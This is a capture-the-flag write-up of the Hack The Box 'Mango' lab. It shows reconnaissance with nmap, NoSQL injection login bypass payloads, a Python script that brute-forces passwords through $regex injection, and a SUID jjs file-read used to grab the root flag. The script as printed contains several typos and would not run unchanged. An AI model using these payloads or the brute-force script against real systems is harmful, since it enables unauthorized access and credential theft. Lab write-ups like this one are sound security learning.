Reconnaissance and Enumeration:

As I always start off, I run an nmap scan.

nmap -sCV -A -p- -v <TARGET IP>

I pretty much use the same tags every time I run my first scan in a lab. I like to cover as much area as possible. I try and get every port, version, and what I can connect too all at once so that I don’t miss anything later on in the lab.

The results are pretty standard. No suspicious or unusual ports open, the usual 22, 80, and 443 are always there to see. We do get a CN for us to visit though. It is staging-order.mango.htb. Before I go immediately try and exploit the first thing I find. I look around a bit more to see if I can find anything else on the website.

As the nmap results stated, port 80 returns a 403 forbidden status code. All I do is change it to https from http.

It then brings me to this page. I get nothing when I click on the ‘Mango Search’ or the ‘I’m Mango’ buttons. I am assuming here that I’m Mango means that the user exists on what I will try and exploit, so I keep that in mind. The only thing in the top right that leads me anywhere is the Analytics page.

It brings me to the analytics.php page. After looking around more. I can tell that I’ll be dealing with some form of SQL. Nothing on this page strikes anything interesting so I move on to the CN that the nmap scan results showed me earlier.

I just have to add it to my /etc/hosts file which I forgot to screenshot but if you are familiar with the labs you already know the command to use. I’ll put it in a block down below.

echo "<TARGET IP> staging-order.mango.htb" | sudo tee -a /etc/hosts

We are brought to this login page. Now I’m getting somewhere. I intercept a POST request with burp suite using the credentials ‘admin:admin’ to analyze the page deeper.

username=admin&password=admin&login=login

This is what it looks like at first. I initially try the basic SQL injection.

username=admin&password=admin&login=' OR 1=1 --

To no avail, That doesn’t return anything. I did learn that this lab focuses on NoSQL and given that I am unfamiliar with the syntax, I do a quick bit of research to learn the basics so I know what a NoSQL injection looks like and how to test for one. Common payloads for NoSQL injections are $ne, $gt, $regex, $where, and $or.

username[$ne]=admin&password[$ne]=admin&login=login

I got something! I noticed that 302 found return code and see what the response looks like in the browser. I’ll give a more in depth explanation of how this works first. A normal query would look like the code block I’ll put below.

db.users.find({"username": "admin", "password": "admin" })

This is a normal NoSQL query. It returns a result if a user with both the exact username and password exists. Some common non-relational databases that use this language are MongoDB, Neo4j, and Azure Cosmos DB. I’ll also put below this what the injected query look like.

db.users.find({"username": {"$ne": "admin"}, "password": {"$ne": "admin" } })

This query asks to find any user where the username is not equal to admin and the password is not equal to admin. This makes the application only check if any user is returned and it logs you in as the first user that meets these conditions. Now I will go look at what it looks like in the browser.

After all of that hard work, this is what I’m left with. I’m able to get to the ‘/home.php’ page, but there isn’t anything that I can do with it. What I can do though is look and see if I can enumerate further to find more valid usernames and passwords. I know that admin is a valid user and potentially mango is too, which I can test out to see if I also get a 302 code. With how HTB labs are, there is almost always a user with the name of the machine that you are doing so I’ll take my chances with that as a good guess.

Exploitation:

There is a POC script on the official writeup for the lab that you can use, but I found a modified version from another person who did the lab that I will use in this. All credit goes to the writer that modified the original script. You can also test manually if you have a lot of time on your hands and know a lot more about NoSQL than I do at this current moment.

#!/bin/usr/python

import requests
import string

url = http://staging-order.mango.htb/index.php
flag = ""

user = "admin"


restart = True

while restart:
  retstart = False

  for i in string.acsii_letters + string.digits + "`~!@#$%^&()-_{}=[]<>;:'":
      payload = flag + i
      post_data = {'username' : user, 'password[$regex]' : "^" + payload + ",*"}
      r = requests.post(url,data=post_data, allow_redirects=False)

      if r.status_code == 302:
          print(payload)
          restart = True
          flag = payload

          if i == "$":
            print("\n[+n] User: " + user + "\n[+] Password: " + flag[:-1])
            exit(0)
          break


This is the modified script. It takes whatever you put in the user variable and loops through to see if it can find a valid password. The $regex function finds if a fields value matches with a specified pattern. For example, sending a payload such as the one I’ll show below can check if a password starts with the letter m. In the context of this script, it loops through continuously and finds values that match until it reconstructs and entire password for a specified user.

password[$regex]=^m.*
python nosql.py

It returns a valid password for the admin user! I take note of this and see what it gives me for mango by changing the user variable.

python nosql.py

Well what do you know, The user mango is a valid user and I got the password! Now that we have both of these credentials. I should be able to get that user flag now. Since ssh was open. I can try and get in with one of these users. I tried to ssh with the admin credentials, but I kept getting a permission denied error.

ssh mango@<TARGET IP>

When I tried it with the mango creds, I was able to login just fine. Now I can get that user flag.

ls
cd admin
cat user.txt
su admin
id
cat user.txt

There was one problem when I tried to open it. I didn’t have the right permissions. This was a simple fix since I got the admin password I just used the ‘su admin’ command to get the permissions to read the flag. Now I can work on escalating my privileges to read the flag in the root directory.

Privilege Escalation:

Now that I have gained solid ground. Let’s see what I can leverage to read the root flag.

sudo -l

Sudo -l didn’t return anything. It’s usually the first thing that I do when I attempt to find ways to escalate my permissions. Since that didn’t work. I’m going to pull out one of my handy one-liners to quickly find something that I can use to my advantage.

find / -type f -perm -4000 2>/dev/null

This one liner searches for all files within the entire system with the SUID bit set. This means the the file can be executed with permissions of the file owner. There is usually always going to be something that can be used such as a SUID that allows you to read or write any file.

I get a huge list back to me. At this point, I will look through and see if anything sticks out as something I can do research on and attempt to use to elevate myself. The one that sticks out to me is the /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs. I did some research and found something very promising. JJS is a command line tool in the Java Development Kit(JDK) that uses the Nashorn JavaScript engine. It allows a user to execute JavaScript code within a Java environment. I proceeded to do a bit of research to see if there was anything that I can find.

Gtfobins gave me a very good answer. This snippet above tells me how I can read files as an unprivileged user. Since I have it in the SUID binaries, I can definitely use this to read the root flag with just a tiny tweak or two.

echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }
while ((line = br.readLine()) != null) { print(line); }' | jjs

Just like that, another root flag captured! For those that read my writeup on RedCross, I definitely felt relieved with finally being able to have less steps to do in order to pwn the machine.
